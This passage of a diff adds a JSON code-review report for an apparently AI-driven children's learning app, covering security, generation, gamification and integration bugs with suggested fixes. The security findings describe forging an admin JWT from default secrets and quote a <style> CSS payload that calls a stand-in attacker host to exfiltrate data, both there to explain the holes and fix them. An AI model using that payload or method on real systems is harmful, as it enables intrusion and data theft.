@@ -1,0 +1,308 @@
+{
+  "confirmed": [
+    {
+      "title": "Insecure default secrets/admin password with no production guard; JWT & Fernet keys derive from APP_SECRET",
+      "file": "backend/app/core/config.py",
+      "severity": "critical",
+      "confirmed": true,
+      "reasoning": "Confirmed by reading the full chain. config.py:41 sets app_secret default to \"dev-insecure-secret-change-me\"; :42-43 set admin_username/admin_password defaults to \"admin\"/\"admin\". jwt_secret (config.py:86-88) = sha256(\"jwt::\"+app_secret) and fernet_key (config.py:91-94) = urlsafe_b64encode(sha256(\"fernet::\"+app_secret)) are both fully deterministic from app_secret, so with the default they are publicly known. create_admin_token (security.py:73-82) signs with jwt_secret; decode_admin_token (security.py:85-90) only verifies signature + realm==\"admin\"; get_current_admin (deps.py:77-91) then accepts ANY validly-signed token whose \"sub\" matches an existing active admin and does NOT re-check the password. bootstrap.py:19-29 creates exactly that default sub=\"admin\" row on first boot. Therefore, when a prod deploy forgets APP_SECRET/ADMIN_*, an attacker can mint a valid {\"sub\":\"admin\",\"role\":\"admin\",\"realm\":\"admin\"} JWT with the known key and gain full admin access; the same default Fernet key makes encrypt_secret/decrypt_secret (security.py:94-106, used for audit raw_prompt blobs) trivially decryptable. No startup assertion blocks defaults in production: main.py lifespan (34-42) performs no such check, is_production (config.py:81-83) is only consumed for CSP/docs gating (main.py:68), and CLAUDE.md:24 / README.md:78-79 merely document the env vars without enforcement. Reachable on the happy path of an incomplete prod config -> data-loss/security-breach class -> critical. Not a misread and not handled elsewhere.",
+      "corrected_fix": "Add a fail-closed startup guard so production refuses to boot with default/weak secrets. In backend/app/core/config.py add a Pydantic v2 model_validator on Settings:\n\n    from pydantic import model_validator\n\n    _DEV_SECRET = \"dev-insecure-secret-change-me\"\n\n    @model_validator(mode=\"after\")\n    def _guard_production_secrets(self) -> \"Settings\":\n        if self.env.lower() == \"production\":\n            problems = []\n            if self.app_secret == self._DEV_SECRET or len(self.app_secret) < 32:\n                problems.append(\"APP_SECRET must be set to a strong (>=32 char) non-default value\")\n            if self.admin_password == \"admin\":\n                problems.append(\"ADMIN_PASSWORD must be set to a non-default value\")\n            if problems:\n                raise ValueError(\"Insecure production config: \" + \"; \".join(problems))\n        return self\n\nThis makes Settings() (config.py:101) raise at import/boot in production when secrets are defaults/weak, blocking the breach. (Equivalently the assertion can live in main.py's lifespan before bootstrap, but a model_validator fails earlier and covers all import paths.) Keep dev defaults for non-production so local dev is unaffected."
+    },
+    {
+      "title": "Claude-SVG production path calls app.llm.client.generate_structured with wrong kwargs → every schematic SVG silently degrades to a placeholder",
+      "file": "backend/app/visuals/claude_svg.py",
+      "severity": "high",
+      "confirmed": true,
+      "reasoning": "Verified against the actual code; the finding is real, not speculative.\n\n1. API surface (backend/app/llm/client.py:191-204): the only structured entry point the module exposes is `generate_structured(*, system_blocks, user, output_model, ...)` (plus `classify`, line 283, which delegates to it). There is NO `parse_svg` and NO `parse`. A repo-wide grep for `def parse`/`def parse_svg` returns only the test fake (tests/test_visuals.py:76) and the Protocol stub inside claude_svg.py itself — nothing in app/.\n\n2. Production dispatch (backend/app/visuals/claude_svg.py:58-75): `_call_structured` uses `_OVERRIDE_CLIENT`, which is only ever set by `set_svg_client`. Grep confirms `set_svg_client` is called nowhere in the production `app` package — only in tests. So in production the override is `None`, the lazy import binds `client = app.llm.client` (the module), and the loop `for attr in ('parse_svg','generate_structured','parse')` finds `parse_svg`→None, then `generate_structured`→the real callable, and invokes it as `fn(system=system, user=user, output_format=SvgGenerationOutput)`.\n\n3. That call raises `TypeError: generate_structured() got an unexpected keyword argument 'system'` (the param is `system_blocks`, not `system`; the output param is `output_model`, not `output_format`; and required `output_model` is missing). `user=` happens to match but the call never gets that far.\n\n4. Swallowed into a placeholder (backend/app/visuals/router.py:169-173): `_ensure_svg` wraps `generate_svg` in `except Exception:` and returns `_placeholder_asset(...)`. So the TypeError is logged at WARNING and the result is the generic placeholder SVG for ALL 9 SVG kinds routed via SVG_VISUAL_KINDS (constants.py:119-122: diagram, chart, labeled_figure, cycle, timeline, geometry, number_line, food_chain, map).\n\n5. Why tests miss it: every SVG-path test injects a fake via `set_svg_client(...)` (test_visuals.py:235,243,251,299) whose `parse(*, system, user, output_format)` matches the `parse` branch. The real module path (override None → generate_structured) is never exercised.\n\nNet effect: in production every schematic SVG visual silently becomes the generic placeholder. Not data loss/security, and generation does not hard-fail (graceful degrade), so high (wrong behavior every user hits on the happy path) rather than critical. Minor note: even after the kwargs are fixed, `generate_structured` returns a `(model, Usage)` tuple, so the result must be unpacked before coercion — the existing `_coerce_output` does not handle a tuple, so the fix must take the first element.",
+      "corrected_fix": "In backend/app/visuals/claude_svg.py, replace the guess-the-entrypoint loop in `_call_structured` (lines 67-75) with a direct call to the real API, special-casing the module path and unpacking the returned tuple:\n\n```python\n    # When no test override is set we call the real B2 wrapper directly.\n    if _OVERRIDE_CLIENT is None:\n        result, _usage = await client.generate_structured(\n            system_blocks=system,\n            user=user,\n            output_model=SvgGenerationOutput,\n        )\n        return _coerce_output(result)\n\n    # Test/DI override exposes the minimal (system, user, output_format) parse surface.\n    result = await client.parse(\n        system=system, user=user, output_format=SvgGenerationOutput\n    )\n    return _coerce_output(result)\n```\n\nThis drops the non-existent `parse_svg`/`parse` guesses and the wrong `system=`/`output_format=` kwargs for the production module, uses the real `system_blocks`/`user`/`output_model` signature, and unpacks the `(model, Usage)` tuple so `_coerce_output` receives the SvgGenerationOutput. (Alternatively, add a thin `parse_svg`/`parse` wrapper to app.llm.client with the (system, user, output_format) shape, but fixing the caller is the smaller, lower-risk change.)"
+    },
+    {
+      "title": "Retry-on-ValidationError is defeated for the native messages.parse path (SPEC §5 \"regenerate max 2 on validation failure\")",
+      "file": "backend/app/llm/client.py",
+      "severity": "high",
+      "confirmed": true,
+      "reasoning": "Verified end-to-end against the installed SDK and app code; the finding is real.\n\n1) The parse call IS outside the retry try-block. In generate_structured (backend/app/llm/client.py), the native path `message = await cli.messages.parse(...)` is at lines 235-243. The try/except that catches (pydantic.ValidationError, GenerationError, json.JSONDecodeError) and appends the corrective instruction + `continue` starts at line 254. Lines 245-252 (request_id, _coerce_usage, _log_usage, _check_stop_reason) sit between them, also outside the try. So any exception from line 235 escapes the loop entirely.\n\n2) The SDK validates structured output synchronously INSIDE the awaited parse call. Confirmed anthropic 0.105.2 (.venv/.../anthropic-0.105.2.dist-info). Chain: cli.messages.parse (resources/messages/messages.py:2609) builds `parser` (2675) = parse_response and passes `post_parser=parser` (2721) into `await self._post(...)`. _base_client.py async `_process_response` ends with `return await api_response.parse()` (line 1886). _response.py AsyncAPIResponse.parse runs `parsed = self._options.post_parser(parsed)` (lines 458-459) during that await. post_parser -> parse_response (lib/_parse/_response.py:60) -> parse_text (line 19) -> `TypeAdapter(output_format).validate_json(text)`, which raises pydantic.ValidationError. Therefore the ValidationError propagates straight out of `await cli.messages.parse(...)` at line 235, never reaching the line-254 try.\n\n3) The failure mode is exactly what SPEC §5 says to retry. SPEC.md:74-76 states Opus 4.8 strips JSON-schema minimum/maximum/minLength/maxLength, bounds must be enforced in Pydantic validators, and the system must \"regenerate (max 2 retries) on validation failure.\" The generation models carry such constraints (backend/app/schemas/generation.py: item_difficulty/partial_credit ranges; intent.py: age ge=3 le=120, classifier_confidence ge=0.0 le=1.0, prompt min_length=1, plus field_validators). validate_json enforces these regardless of the (stripped) wire schema, so an out-of-bounds count/range produces ValidationError at line 235.\n\n4) It bubbles to status='error' instead of regenerating. All production generators use the native path (default use_tools_fallback=False): quiz_generator.py:111, lesson_generator.py:238/327/459, grader.py:62 — none pass use_tools_fallback=True. The exception flows generate_structured -> generate_quiz/generate_lesson -> run_generation (orchestrator.py, which deliberately lets exceptions propagate, line 28) -> _safe_generate (api/v1/routes/requests.py:66-81), whose bare `except Exception` sets lr.status='error' (line 76) and publishes an 'error' SSE event. The corrective-instruction retry at lines 264-272 only ever fires for the rarely-used tools fallback or the text-JSON fallback branch in _extract_parsed; for the native parse path it is effectively dead code. Net effect: a transient bad generation that SPEC requires be retried up to twice instead hard-fails the learning request on the happy path. High (wrong behavior real users will hit), not critical (degrades gracefully to an error screen; no data loss/security breach).",
+      "corrected_fix": "Bring both provider calls inside the existing try so a ValidationError from messages.parse triggers the corrective-instruction retry. Move the call into the try block, then do stop_reason/usage handling after a successful parse. In backend/app/llm/client.py, replace the loop body (currently: call at 225-243 outside, then usage/_check_stop_reason at 245-252 outside, then try at 254) with:\n\n    for _attempt in range(MAX_VALIDATION_RETRIES + 1):\n        user_text = user if not correction else f\"{user}\\n\\n{correction}\"\n        messages = [{\"role\": \"user\", \"content\": user_text}]\n        try:\n            if use_tools_fallback:\n                tool = _tool_for(output_model)\n                message = await cli.messages.create(\n                    model=model, max_tokens=max_tokens, thinking=ADAPTIVE_THINKING,\n                    tools=[tool], tool_choice={\"type\": \"tool\", \"name\": tool[\"name\"]},\n                    system=system, messages=messages,\n                )\n            else:\n                message = await cli.messages.parse(\n                    model=model, max_tokens=max_tokens, thinking=ADAPTIVE_THINKING,\n                    output_config={\"effort\": effort}, output_format=output_model,\n                    system=system, messages=messages,\n                )\n            raw_request_id = getattr(message, \"_request_id\", None) or getattr(message, \"id\", None)\n            usage = _coerce_usage(getattr(message, \"usage\", None), model, raw_request_id)\n            _log_usage(db, usage, request_id=request_id, profile_id=profile_id)\n            _check_stop_reason(getattr(message, \"stop_reason\", None))\n            if use_tools_fallback:\n                payload = _extract_tool_payload(message)\n                if payload is None:\n                    raise GenerationError(\"No tool_use block in response.\")\n                result = output_model.model_validate(payload)\n            else:\n                result = _extract_parsed(message, output_model)\n                if result is None:\n                    raise GenerationError(\"No parsable structured output in response.\")\n        except (pydantic.ValidationError, GenerationError, json.JSONDecodeError) as exc:\n            last_error = exc\n            correction = (\n                \"Your previous output failed validation. Re-emit a SINGLE valid object that \"\n                \"strictly matches the required schema and ALL stated bounds (exact counts, ranges, \"\n                \"and field types). Do not add extra fields. Validation error: \"\n                f\"{str(exc)[:500]}\"\n            )\n            continue\n        return result, usage\n\nNote: usage is logged on the same attempt that raised (after the await succeeds but before validation), which preserves token-telemetry/cache-observability accounting for the failed attempt; if logging only successful attempts is preferred, move _log_usage to just before `return result, usage`. _check_stop_reason already raises GenerationError, which the except now catches and retries — acceptable and arguably desirable for transient pause_turn/max_tokens."
+    },
+    {
+      "title": "SSE 'plan' event sends list[str] but frontend store expects list[SectionStub] — loading checklist + progress bar broken on the happy path",
+      "file": "backend/app/llm/lesson_generator.py",
+      "severity": "high",
+      "confirmed": true,
+      "reasoning": "CONFIRMED, end-to-end traced. backend/app/llm/lesson_generator.py:338-340 publishes the 'plan' event as {\"sections\": [s.kind.value for s in _ordered_stubs(plan)]} — a list of plain strings (e.g. [\"hook\",\"objectives\",...]). The SSE broker (backend/app/core/tasks.py:39) stores data verbatim and the route (backend/app/api/v1/routes/requests.py:134,140,147) json.dumps it unchanged, so the frontend receives the raw string array. The store at frontend/src/stores/generation.ts:33-34 does `const list = (d).sections; if (Array.isArray(list)) sections.value = list`, assigning the string[] straight into sections: SectionStub[].\n\nDownstream consequences are deterministic on the happy path:\n- frontend/src/composables/useGeneration.ts:48-57 maps each string reading s.ordinal/s.kind/s.title → all undefined. The .sort((a,b)=>a.ordinal-b.ordinal) computes undefined-undefined=NaN (no-op). done = !!s.title || builtOrdinals.has(s.ordinal) → false (builtOrdinals is never added to — verified it is only reset at line 34 and read at line 55, so it is dead and always empty).\n- The per-section 'section' event is published at lesson_generator.py:444-446 as {\"ordinal\":ordinal,\"kind\":gen.kind.value} (NO title). In the store onSection (generation.ts:36-39), findIndex(s=>s.ordinal===d.ordinal) never matches the seeded strings (their .ordinal is undefined), so every section event PUSHES a new object. After N sections, gen.sections has N strings + N objects = length 2N. totalSections=2N, and since none have a title and builtOrdinals is empty, builtCount stays 0 → progressPct = round(0/2N*100) = 0% for the entire run, then jumps to 100% only when status==='ready' (useGeneration.ts:63-67).\n- LoadingView.vue:131 renders {{ s.title || s.kind }} = undefined||undefined; this displays as an EMPTY string (Vue interpolation renders undefined as '', NOT the literal text 'undefined' — the generation review's wording is slightly off here, but the row is still blank and the ✓/○ tick never flips off ○).\n\nNet effect: blank checklist rows that never tick, and a progress bar stuck at 0% then snapping to 100% — the whole progress UI is wrong for every user on the happy path. It is not a crash and generation still completes/navigates (the 'ready' event drives destination), so it is wrong-behavior (high), not critical. The finding's core mechanism and severity are correct; only the \"renders 'undefined'\" detail is imprecise.",
+      "corrected_fix": "Emit plan sections as objects matching the SectionStub contract, and include the title in the per-section event so the tick can flip (since builtOrdinals is dead code and `done` relies solely on `!!s.title`).\n\nbackend/app/llm/lesson_generator.py:338-340 — change the plan publish to:\n    await task_registry.publish(\n        request_id,\n        \"plan\",\n        {\"sections\": [\n            {\"ordinal\": i, \"kind\": s.kind.value, \"title\": s.title}\n            for i, s in enumerate(_ordered_stubs(plan))\n        ]},\n    )\nThis makes the store's direct `sections.value = list` assignment produce real SectionStub objects (ordinal/kind/title), and onSection's findIndex-by-ordinal merge will now match the seeded stubs instead of pushing duplicates.\n\nAlso at lesson_generator.py:444-446, include the section title so the checklist actually ticks done (builtOrdinals is never populated, so `done` depends on `!!s.title`):\n    await task_registry.publish(\n        request_id, \"section\", {\"ordinal\": ordinal, \"kind\": gen.kind.value, \"title\": gen.title}\n    )\n(If `gen` does not carry a title at that point, use the corresponding ordered stub's title, e.g. ordered_stubs[ordinal].title.)\n\nThis keeps both fixes in the backend, aligned with the frontend SectionStub type, with no frontend changes required."
+    },
+    {
+      "title": "Hotspot quiz/lesson items are delivered with no image (image_request never realized into an asset)",
+      "file": "backend/app/llm/quiz_generator.py",
+      "severity": "high",
+      "confirmed": true,
+      "reasoning": "Verified every link in the chain against the actual code.\n\n1. GenHotspotPayload (schemas/generation.py:88-91) carries only image_request + regions — no image_url/image_asset_hash.\n2. quiz_generator._persist_quiz_item (quiz_generator.py:64-86) persists the payload verbatim via payload_json=gen.payload.model_dump(mode=\"json\") (line 74) and the QuizQuestion is added at line 153-155. The module imports neither ensure_visual nor AssetsRef; no image realization happens anywhere in the file.\n3. The lesson path is identical: lesson_generator._persist_item (185-207) stores the payload verbatim, and the ONLY AssetsRef construction in the codebase (grep-confirmed) is lesson_generator.py:296, which sets lesson_section_id and never item_id.\n4. AssetsRef has an item_id column (models/content.py:167) and the serializer's hotspot fill path queries by it (serializers.py:79, 106-110 via _assets_for(item_id=...)), but nothing ever writes an AssetsRef row with item_id set. So _assets_for returns empty for every hotspot item.\n5. _strip_payload (serializers.py:63-72) reads image_url/image_asset_hash from the stored payload, but those keys do not exist in GenHotspotPayload, so both are None. With no item-level AssetsRef, the serializer leaves them None.\n6. Frontend HotspotQuestion.vue:49-53 computes imageSrc='' when both are null, and binds it at template line 122 (<img :src=\"imageSrc\">), rendering a broken/empty image. The numbered region buttons are absolutely positioned over this blank image (boxStyle, lines 62-98), so the learner sees context-free overlays.\n7. This path is live, not dead: the pedagogy prompt explicitly instructs the model to emit hotspot items with an image_request describing a figure (prompts/pedagogy.py:218 EN, :425 CS), and ItemType.HOTSPOT is a first-class enum value (enums.py:95).\n\nSeverity is high, not critical: the item is still gradable server-side because grading uses region.is_correct (services/gamification.py:135-138), not the image, and nothing crashes or leaks. But every hotspot question a user receives shows a broken image with floating numbered hotspots and no figure to click — wrong behavior users will hit on a happy path the model is told to produce.\n\nThe original suggested fix is directionally right but technically imprecise: ensure_visual cannot be called on a raw image_request string — its signature is ensure_visual(db, spec: GenVisualSpec, *, language, grade_band) (visuals/__init__.py:15-24, router.py:241-242). A GenVisualSpec must be constructed first. Both the quiz and lesson item-persist paths need the fix.",
+      "corrected_fix": "Realize the hotspot image when persisting an item whose payload is a hotspot, then link it to the item via an item-level AssetsRef so serializers._assets_for(item_id=...) can fill image_url. Apply to both quiz_generator._persist_quiz_item and lesson_generator._persist_item (factor into a shared helper). Construct a GenVisualSpec from image_request (ensure_visual takes a spec, not a raw string) and guard exactly like _attach_visuals so a visuals outage never breaks generation.\n\nIn quiz_generator.py, after db.flush() at line 85 (item now has an id):\n\n    from ..schemas.generation import GenVisualSpec  # top of file\n    from ..schemas.enums import VisualKind, LayoutSlot\n    from ..models import AssetsRef\n    ...\n    db.add(item)\n    await db.flush()\n    if isinstance(gen.payload, GenHotspotPayload) and gen.payload.image_request:\n        from ..visuals import ensure_visual  # lazy, mirrors lesson_generator\n        spec = GenVisualSpec(\n            section_ordinal=0,\n            visual_kind=VisualKind.LABELED_FIGURE,\n            layout_slot=LayoutSlot.QUIZ_THUMB,\n            image_prompt=gen.payload.image_request,\n            alt_text=gen.stem_markdown[:200] or \"hotspot image\",\n        )\n        try:\n            asset = await ensure_visual(db, spec, language=quiz.language, grade_band=quiz.grade_band)\n            db.add(AssetsRef(\n                item_id=item.id,\n                visual_asset_hash=asset.hash,\n                layout_slot=spec.layout_slot.value,\n                alt_text=spec.alt_text,\n            ))\n            await db.flush()\n        except (NotImplementedError, Exception):\n            pass  # ensure_visual already degrades to a placeholder; never break generation\n    return item\n\n(Use the same block in lesson_generator._persist_item after its flush at line 206, passing language=lesson.detected_language, grade_band=lesson.grade_band.) This is the minimal change; the serializer (serializers.py:106-110) already fills image_url from an item-level AssetsRef, so no serializer/frontend change is needed."
+    }
+  ],
+  "medium_low": [
+    {
+      "area": "security",
+      "severity": "medium",
+      "file": "backend/app/visuals/svg_sanitize.py",
+      "line": "28, 86-110",
+      "title": "Server SVG sanitizer does not strip <style> elements or scan their CSS (external url()/@import survive)",
+      "detail": "_FORBIDDEN_TAGS (line 28) omits 'style'. The per-element loop (86-110) only inspects the inline style= ATTRIBUTE for url()/javascript()/expression(); it never examines the text content of a <style> element. An LLM-emitted SVG containing e.g. <style>@import url('https://attacker/x.css'); rect{background:url('https://attacker/log?d=...')}</style> passes server sanitization unchanged. The asset is then served raw as image/svg+xml (assets.py:29) and also inlined via svg_inline in SafeContent, so it can trigger external resource fetches / CSS-based exfiltration. This contradicts the stated invariant that the server sanitizer strips external references (svg_sanitize.py docstring; SPEC §5 'server sanitizes SVG'). The frontend DOMPurify SVG profile (safeContent.ts:125) also retains <style>, so neither layer blocks it. No test covers a <style> CSS payload (test_visuals.py).",
+      "suggested_fix": "Add 'style' to _FORBIDDEN_TAGS (children's diagrams use presentation attributes/inline fills, not <style> blocks), OR scan each <style> element's .text for url(/@import/expression( and raise SvgSanitizeError. Mirror by adding FORBID_TAGS:['style'] to SVG_PURIFY_CONFIG in safeContent.ts.",
+      "confidence": 0.8
+    },
+    {
+      "area": "security",
+      "severity": "low",
+      "file": "backend/app/api/v1/routes/admin.py",
+      "line": "137",
+      "title": "Admin audit view always shows empty topic hash (reads wrong key)",
+      "detail": "audit.py:_hashed_verdict sets data['topic']='' and stores the hash under data['topic_sha256'] (audit.py:34-35). admin.py:137 builds AuditRecord.topic_hash from (r.classifier_verdict_json or {}).get('topic'), which is always the empty string, so the admin audit/forensics column is permanently blank and the per-topic correlation it was designed for is unusable. No security leak, but the feature is broken.",
+      "suggested_fix": "Change admin.py:137 to .get('topic_sha256').",
+      "confidence": 0.95
+    },
+    {
+      "area": "security",
+      "severity": "low",
+      "file": "frontend/src/lib/safeContent.ts",
+      "line": "120",
+      "title": "Markdown DOMPurify config allows untrusted 'style' attribute (minor CSS-injection surface)",
+      "detail": "MD_PURIFY_CONFIG adds 'style' to ADD_ATTR (line 120). Markdown source is escaped (html:false) so an attacker cannot author a raw style= attribute via markdown text; the allowance is to preserve KaTeX inline styles. However it widens the attribute allowlist for all sanitized markdown HTML, permitting LLM-influenced inline CSS (e.g. position:fixed full-screen overlays / clickjacking-style affordances) to survive. DOMPurify strips url()/expression in styles, so this is not script execution. Lower-risk but inconsistent with the strict output-safety posture.",
+      "suggested_fix": "Drop 'style' from ADD_ATTR and instead rely on KaTeX's class-based output (it works without inline style), or scope the style allowance only to math nodes via a hook.",
+      "confidence": 0.5
+    },
+    {
+      "area": "gamification",
+      "severity": "medium",
+      "file": "app/services/gamification.py",
+      "line": "625-633",
+      "title": "finalize_attempt MasteryChange always reports before == after (zero delta)",
+      "detail": "In finalize_attempt, each MasteryChange is built with before=sm.mastery and after=sm.mastery — both read the SAME current SkillMastery row. There is no captured session-start snapshot, so the session results summary always reports a zero mastery delta for every concept, even when mastery genuinely grew during the attempt. The MasteryChange schema (schemas/gamification.py:85-90) has distinct before/after fields specifically to surface this delta, so the contract intent is violated. Per-answer grade_and_reward computes the real before/after (gamification.py:452-455) but those are not aggregated into the summary.",
+      "suggested_fix": "Capture the per-concept mastery at attempt start (e.g. persist a snapshot when the attempt begins, or accumulate the sum of per-answer mastery_delta values keyed by concept during grade_and_reward) and use that as `before`, keeping the current row value as `after`. Minimal interim fix: sum the mastery_delta of this attempt's answers per concept and set before = after - summed_delta.",
+      "confidence": 0.85
+    },
+    {
+      "area": "gamification",
+      "severity": "medium",
+      "file": "app/services/gamification.py",
+      "line": "142-144,170-176",
+      "title": "accepted_variants are never consulted in deterministic / fallback grading",
+      "detail": "Items carry accepted_variants_json (models/content.py:124) and generation produces GenItem.accepted_variants (schemas/generation.py:115), intended as alternative correct answers. However neither the deterministic unknown/closed-form branch (compares only item.expected_answer) nor the free-text deterministic fallback (line 175 compares only item.expected_answer) ever reads accepted_variants_json. The LLM grader prompt is also only given expected_answer (llm/grader.py:58). As a result, a learner who submits a documented accepted variant (synonym / alternate canonical form) for short_answer/numeric can be marked WRONG whenever grading falls back to deterministic comparison (LLM unavailable/exception) or when the LLM is strict. cloze blanks similarly only check a single `answer` with no variant support.",
+      "suggested_fix": "In the deterministic comparison paths, accept the answer if _norm_text(submitted) equals expected OR matches any entry in item.accepted_variants_json. Also pass accepted_variants into prompts.build_grader_user so the LLM honors them.",
+      "confidence": 0.7
+    },
+    {
+      "area": "gamification",
+      "severity": "low",
+      "file": "app/services/gamification.py",
+      "line": "379-396,467-468",
+      "title": "Combo counter counts any correct-no-hint answer, not strictly first-try-correct",
+      "detail": "_attempt_combo (and the combo_max loop in finalize_attempt, lines 605-612) increments on (is_correct AND not used_hint) without checking that the answer was the learner's FIRST try on that item. The docstrings and gamification design state the combo is for 'consecutive first-try-correct' answers. If an item is re-answered within the same attempt (correct, no hint), it inflates the combo multiplier and combo_max. Within a normal one-answer-per-item quiz the impact is small, but the behavior diverges from the documented contract.",
+      "suggested_fix": "Track/first-try status per answer (e.g. add a first_try flag to the Answer row, or join to detect prior answers for the same item within the attempt) and only count answers that were first-try in _attempt_combo and the finalize_attempt combo_max loop.",
+      "confidence": 0.6
+    },
+    {
+      "area": "gamification",
+      "severity": "low",
+      "file": "app/services/gamification.py",
+      "line": "719-721,745-746",
+      "title": "Rest-days consumed on a Monday return are immediately refunded (reset ordering)",
+      "detail": "settle_streak consumes weekly rest-day allowance (rest_days_used_this_week += 1) at lines 719-721, but then unconditionally resets rest_days_used_this_week to 0 when today.weekday()==0 (Monday) at lines 745-746 — which runs AFTER the consumption in the same call. So when a learner returns on a Monday and a missed day is covered by a rest day, the rest-day usage is wiped before persist, effectively granting unlimited 'free' rest-day coverage on Mondays. Minor forgiveness leak, not loss-framed, but inconsistent with the bounded rest_days_per_week budget.",
+      "suggested_fix": "Reset the weekly rest budget BEFORE the gap/forgiveness logic (move the Monday reset above the gap_days handling), or only reset when last_active_date is in a prior ISO week, so consumption recorded for the current return day is not erased.",
+      "confidence": 0.6
+    },
+    {
+      "area": "gamification",
+      "severity": "low",
+      "file": "app/services/gamification.py",
+      "line": "705-707,740-743",
+      "title": "freezes_used_in_current_streak / rest_days_used_this_week not reset when a brand-new streak starts (last is None)",
+      "detail": "When the very first activity is recorded (last is None branch, lines 705-707) the code sets current_streak_len=1 and is_perfect=True but does not zero freezes_used_in_current_streak or rest_days_used_this_week. The streak-break branch (lines 740-743) does reset them. For a freshly-created StreakState the defaults are 0 so this is usually harmless, but if a StreakState row is ever reused/seeded with non-zero counters the new streak inherits stale freeze accounting, which can incorrectly cap future freezes via _freeze_cap.",
+      "suggested_fix": "In the `last is None` branch, also set streak.freezes_used_in_current_streak = 0 and streak.rest_days_used_this_week = 0 for symmetry with the reset branch.",
+      "confidence": 0.5
+    },
+    {
+      "area": "gamification",
+      "severity": "low",
+      "file": "app/services/gamification.py",
+      "line": "731-738",
+      "title": "Repair-window-only continuation does not mark streak as non-perfect",
+      "detail": "When a missed day is bridged solely by the 48h repair window (covered < missed but missed <= 1 and within_repair, lines 735-738), the streak is advanced and frozen=True is returned, but is_perfect is left True. The freeze-inventory path (line 727) sets is_perfect=False. Using the repair window is also a forgiveness mechanism, so a 'perfect' streak can include a silently repaired gap, which is inconsistent with the documented is_perfect = 'no freezes ever used' intent (the user did skip a day).",
+      "suggested_fix": "Set streak.is_perfect = False in the repair-window continuation branch (when within_repair causes the advance), matching the freeze path.",
+      "confidence": 0.45
+    },
+    {
+      "area": "gamification",
+      "severity": "low",
+      "file": "app/services/badges.py",
+      "line": "385-401",
+      "title": "Tiered badge tier is recorded at creation before the tier is actually unlocked",
+      "detail": "For a tiered badge (tree_grower), a new ProfileBadge is created with tier=tier_reached (line 385) even when num < den (not yet unlocked). pb.tier therefore reflects an un-unlocked tier. On the later evaluation that crosses the threshold, tier_advanced = tier > (pb.tier or 1) evaluates against the already-stored tier and can be False, so the unlock relies on first_unlock. This works for the first unlock but can mis-track subsequent tier advances (e.g. progress recorded at tier 1 then jumping straight to tier 3) where tier_advanced compares against an inflated stored tier. No double-award occurs, but the surfaced tier on tier-skips can be off-by-one.",
+      "suggested_fix": "Only set pb.tier to a tier once it is actually unlocked (num>=den for that tier). On creation, store the currently-unlocked tier (0/1) rather than tier_reached, and let the unlock block bump pb.tier.",
+      "confidence": 0.4
+    },
+    {
+      "area": "generation",
+      "severity": "medium",
+      "file": "backend/app/llm/quiz_generator.py",
+      "line": "157",
+      "title": "Quiz 'section' SSE event omits ordinal/kind the frontend onSection handler requires",
+      "detail": "generate_quiz publishes task_registry.publish(request_id,'section',{'questions': len(...)}) — no ordinal/kind/title. The frontend onSection (api.ts:166, stores/generation.ts:36-39) is typed {ordinal,kind,title?} and does findIndex(s.ordinal === d.ordinal); with d.ordinal undefined it matches nothing and pushes {questions:N} into the sections list, polluting the checklist for quizzes. For tests this is benign, but the loading UI for the TEST mode shows a stray/empty checklist row.",
+      "suggested_fix": "Either emit a quiz-appropriate progress event the store understands (e.g. publish per-question 'section' events with {ordinal,kind:'question'}), or have the store ignore section frames lacking an ordinal. At minimum send {'ordinal':0,'kind':'quiz','title':...} so it doesn't corrupt the section list.",
+      "confidence": 0.8
+    },
+    {
+      "area": "generation",
+      "severity": "medium",
+      "file": "backend/app/llm/orchestrator.py",
+      "line": "41-45",
+      "title": "DB status 'generating' is flushed but never committed during generation → poll-fallback endpoint reports stale 'queued'",
+      "detail": "run_generation sets lr.status='generating' and only db.flush()es (no commit) at lines 41-42; the first commit happens only after the lesson/quiz fully generates (lines 53-54 / 65-66). Until then the committed row still reads status='queued'. The SSE path is fine (a 'status' event is published), but the SPEC-mandated poll fallback GET /requests/{id} (requests.py:_status_payload) reads the committed DB and returns 'queued' for the entire (potentially 30s+) generation window, so any client relying on polling instead of SSE never sees 'generating'.",
+      "suggested_fix": "Commit the status transition before starting generation: after `lr.status='generating'; await db.flush()` add `await db.commit()` (then continue generating). The generators open the same session, so a commit here is safe.",
+      "confidence": 0.7
+    },
+    {
+      "area": "generation",
+      "severity": "low",
+      "file": "backend/app/lib/api.ts (frontend) / backend SSE 'error' event",
+      "line": "frontend/src/lib/api.ts:191-194",
+      "title": "Server-sent 'error' SSE event name collides with EventSource's native error event",
+      "detail": "The backend uses a named SSE event 'error' (requests.py:79-81). On the client, es.addEventListener('error', ...) ALSO fires for native EventSource connection errors, whose MessageEvent has no .data (undefined). The handler does JSON.parse(ev.data) inside try/catch and swallows the failure, so a transport drop is silently ignored rather than surfaced as a generation error; conversely the named error frame is parsed correctly. Functionally tolerable but means real connection failures never reach onError/the user.",
+      "suggested_fix": "Rename the backend terminal failure event (e.g. 'failed' / 'gen_error') so it doesn't shadow EventSource's reserved 'error', and add a dedicated es.onerror handler for transport issues; or guard the listener to only act when ev.data is present and treat native errors separately.",
+      "confidence": 0.6
+    },
+    {
+      "area": "integration",
+      "severity": "medium",
+      "file": "backend/app/services/gamification.py",
+      "line": "616-633",
+      "title": "ResultsSummary.mastery_changes reports before == after (always zero delta)",
+      "detail": "finalize_attempt builds each MasteryChange with before=sm.mastery and after=sm.mastery (the same current value), so the results screen can never show how much mastery moved during the attempt. The per-answer deltas were computed live in grade_and_reward (mastery_before/mastery_after) but are not captured for the session summary. This is a frozen service the F4 ResultsView will consume; the 'mastery changes' UI will always render no movement.",
+      "suggested_fix": "Capture the pre-attempt mastery per concept (e.g. snapshot SkillMastery.mastery at start_attempt, or accumulate the first mastery_before seen per concept during grading) and pass it as `before`, keeping the post value as `after`.",
+      "confidence": 0.75
+    },
+    {
+      "area": "integration",
+      "severity": "medium",
+      "file": "backend/app/api/v1/routes/review.py",
+      "line": "30-47",
+      "title": "POST /review/{item_id} ignores the explicit `rating` field",
+      "detail": "ReviewRatingIn (schemas/gamification.py:119-123) and the frontend api.reviewItem (lib/api.ts:144) both allow a rating-only submission (explicit FSRS 1..4 with no submitted_value). The route always constructs an AnswerIn from submitted_value and calls grade_and_reward, which derives the rating from correctness; body.rating is dropped entirely. A client that sends only {rating: 4} will have submitted_value=None, be graded incorrect, and get fsrs_rating=Again — the opposite of what was requested. The schema/api advertise a capability the route doesn't honor.",
+      "suggested_fix": "If body.rating is provided and body.submitted_value is None, branch to a rating-only path (advance the FSRS card via srs_service.review with the explicit rating and skip correctness grading), or remove `rating` from ReviewRatingIn / the api client to keep the contract honest.",
+      "confidence": 0.7
+    },
+    {
